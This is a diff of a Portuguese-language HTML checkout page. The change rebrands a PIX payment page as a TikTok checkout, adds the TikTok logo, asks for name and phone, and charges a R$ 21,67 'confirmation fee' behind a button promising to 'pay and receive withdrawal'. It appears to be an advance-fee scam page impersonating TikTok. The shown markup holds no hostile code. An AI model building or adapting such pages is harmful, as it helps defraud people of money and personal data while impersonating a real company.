@@ -3,112 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checkout - Pagamento PIX</title>
+    <title>TikTok - Checkout</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="checkout-container">
-        <div class="checkout-header">
-            <h1>Finalizar Pagamento</h1>
-            <p class="subtitle">Taxa de Confirmação</p>
-        </div>
-
-        <div class="checkout-content">
-            <!-- Resumo do Pedido -->
-            <div class="order-summary">
-                <h2>Resumo do Pedido</h2>
-                <div class="summary-item">
-                    <span>Taxa de confirmação</span>
-                    <span class="price" id="order-total">R$ 21,67</span>
+    <div class="checkout-wrapper">
+        <div class="checkout-container">
+            <!-- Coluna Esquerda: Resumo do Pedido -->
+            <div class="order-summary-column">
+                <div class="tiktok-logo">
+                    <img src="../app/images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok Logo" id="tiktok-logo-img">
                 </div>
-                <div class="summary-total">
+                <div class="order-items">
+                    <div class="order-item">
+                        <span>Taxa de confirmação</span>
+                    </div>
+                    <div class="order-item">
+                        <span>Taxa de confirmação</span>
+                    </div>
+                </div>
+                <div class="order-total">
                     <span>Total</span>
-                    <span class="total-price" id="final-total">R$ 21,67</span>
+                    <span class="total-amount" id="order-total">R$ 21,67</span>
                 </div>
             </div>
 
-            <!-- Formulário de Dados -->
-            <form id="checkout-form" class="checkout-form">
-                <div class="form-section">
-                    <h3>Dados Pessoais</h3>
-                    <div class="form-group">
-                        <label for="fullName">Nome Completo *</label>
-                        <input type="text" id="fullName" name="fullName" required placeholder="Nome e sobrenome">
-                    </div>
-                    <div class="form-group">
-                        <label for="email">E-mail *</label>
-                        <input type="email" id="email" name="email" required placeholder="seu@email.com">
-                    </div>
-                    <div class="form-group">
-                        <label for="phone">Telefone *</label>
-                        <input type="tel" id="phone" name="phone" required placeholder="(85) 9 9999-9999">
-                    </div>
-                    <div class="form-group">
-                        <label for="document">CPF *</label>
-                        <input type="text" id="document" name="document" required placeholder="000.000.000-00" maxlength="14">
-                    </div>
-                </div>
-
-                <div class="form-section">
-                    <h3>Método de Pagamento</h3>
-                    <div class="payment-method">
-                        <div class="payment-option active" data-method="pix">
-                            <div class="payment-icon">💳</div>
-                            <div class="payment-info">
-                                <span class="payment-name">PIX</span>
-                                <span class="payment-desc">Aprovação imediata</span>
+            <!-- Coluna Direita: Formulário -->
+            <div class="checkout-form-column">
+                <form id="checkout-form" class="checkout-form">
+                    <!-- Seção Identificação -->
+                    <div class="form-section">
+                        <h2 class="section-title">
+                            <span class="icon-user">👤</span>
+                            Identificação
+                        </h2>
+                        <div class="form-grid">
+                            <div class="form-group full-width">
+                                <label for="fullName">Nome completo</label>
+                                <input type="text" id="fullName" name="fullName" required placeholder="Nome e sobrenome">
                             </div>
-                            <input type="radio" name="paymentMethod" value="pix" checked>
+                            <div class="form-group full-width">
+                                <label for="phone">Telefone</label>
+                                <input type="tel" id="phone" name="phone" required placeholder="(85) 9 9999-9999">
+                            </div>
                         </div>
                     </div>
-                </div>
 
-                <button type="submit" class="submit-button" id="submit-btn">
-                    <span>GERAR PIX E FINALIZAR</span>
-                </button>
-
-                <p class="terms-text">
-                    Ao finalizar o pagamento você concorda com nossos 
-                    <a href="#" target="_blank">termos de uso</a> e 
-                    <a href="#" target="_blank">política de privacidade</a>.
-                </p>
-            </form>
-
-            <!-- Área do PIX (oculta inicialmente) -->
-            <div id="pix-area" class="pix-area" style="display: none;">
-                <div class="pix-header">
-                    <h2>Pagamento via PIX</h2>
-                    <p class="pix-instructions">Escaneie o QR Code ou copie o código PIX</p>
-                </div>
-
-                <div class="pix-content">
-                    <div class="pix-qr-code" id="pix-qr-container">
-                        <!-- QR Code será inserido aqui -->
+                    <!-- Seção Método de Pagamento -->
+                    <div class="form-section">
+                        <h2 class="section-title">Escolha um método de pagamento...</h2>
+                        <div class="payment-methods">
+                            <label class="payment-option active" for="pix">
+                                <div class="payment-icon">
+                                    <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+                                        <path d="M10 0C4.477 0 0 4.477 0 10s4.477 10 10 10 10-4.477 10-10S15.523 0 10 0zm0 18c-4.411 0-8-3.589-8-8s3.589-8 8-8 8 3.589 8 8-3.589 8-8 8z" fill="currentColor"/>
+                                        <path d="M10 5v10M5 10h10" stroke="currentColor" stroke-width="2"/>
+                                    </svg>
+                                </div>
+                                <div class="payment-info">
+                                    <span class="payment-name">Pagamento via Pix</span>
+                                    <span class="payment-desc">Aprovação imediata.</span>
+                                </div>
+                                <input type="radio" id="pix" name="paymentMethod" value="pix" checked>
+                            </label>
+                        </div>
                     </div>
 
-                    <div class="pix-code-section">
-                        <label for="pix-code">Código PIX (Copiar e Colar)</label>
-                        <div class="pix-code-input-wrapper">
+                    <button type="submit" class="submit-button" id="submit-btn">
+                        PAGAR E RECEBER SAQUE!
+                    </button>
+
+                    <p class="terms-text">
+                        Ao finalizar o pagamento você concorda com nossos 
+                        <a href="#" target="_blank">termos de uso</a> e 
+                        <a href="#" target="_blank">política de privacidade</a>.
+                    </p>
+                </form>
+
+                <!-- Área do PIX (oculta inicialmente) -->
+                <div id="pix-area" class="pix-area" style="display: none;">
+                    <div class="pix-header">
+                        <h2>Escaneie o QR-code ou copie o código.</h2>
+                    </div>
+
+                    <div class="pix-content">
+                        <div class="pix-qr-code" id="pix-qr-container">
+                            <!-- QR Code será inserido aqui -->
+                        </div>
+
+                        <div class="pix-value">
+                            <span>Valor PIX:</span>
+                            <span class="pix-amount-value" id="pix-amount">R$ 21,67</span>
+                        </div>
+
+                        <div class="pix-code-section">
                             <textarea id="pix-code" readonly></textarea>
-                            <button type="button" class="copy-button" id="copy-pix-btn">
-                                <span>Copiar</span>
+                            <button type="button" class="copy-pix-button" id="copy-pix-btn">
+                                <span>Copiar PIX</span>
                             </button>
                         </div>
-                    </div>
 
-                    <div class="pix-info">
-                        <div class="info-item">
-                            <span class="info-label">Valor:</span>
-                            <span class="info-value" id="pix-amount">R$ 21,67</span>
+                        <div class="pix-instructions">
+                            <h3>Como pagar:</h3>
+                            <ol>
+                                <li>Abra o aplicativo do seu banco e selecione a opção de pagamento PIX</li>
+                                <li>Escolha pagar usando o código QR ou copie o código PIX acima</li>
+                                <li>Confirme os detalhes do pagamento e o destinatário</li>
+                                <li>Conclua o pagamento e guarde o comprovante (você será redirecionado automaticamente após o pagamento)</li>
+                            </ol>
                         </div>
-                        <div class="info-item">
-                            <span class="info-label">Status:</span>
-                            <span class="info-value" id="pix-status">Aguardando pagamento</span>
-                        </div>
-                    </div>
-
-                    <div class="pix-timer">
-                        <p>⏱️ Este código expira em <span id="timer">30:00</span></p>
                     </div>
                 </div>
             </div>
@@ -119,4 +122,3 @@
     <script src="checkout.js"></script>
 </body>
 </html>
-
